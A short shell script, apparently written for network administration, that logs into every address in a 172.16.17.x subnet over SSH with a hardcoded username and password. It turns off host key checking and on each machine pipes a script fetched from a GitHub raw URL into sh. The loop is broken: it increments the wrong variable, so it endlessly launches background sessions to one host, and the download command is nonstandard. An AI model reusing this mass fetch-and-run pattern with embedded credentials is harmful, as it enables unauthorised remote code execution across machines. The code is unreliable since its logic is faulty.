#!/bin/sh
# Pedro Almeida - pedroalmeida173@gmail.com

port=22

pass=fucker
user=mother

network="172.16.17."

ipinicio=1
ipfim=254

while [ $ipinicio -le $ipfim ]
do
  sshpass -p $pass ssh -p$port -oConnectTimeout=10 -oStrictHostKeyChecking=no $user@$network$ipinicio "trigger_url https://raw.githubusercontent.com/pedrodealmeida/remove_mf/master/removemfv2.sh | sh"&
  x=$(( $ipinicio + 1 ))
done

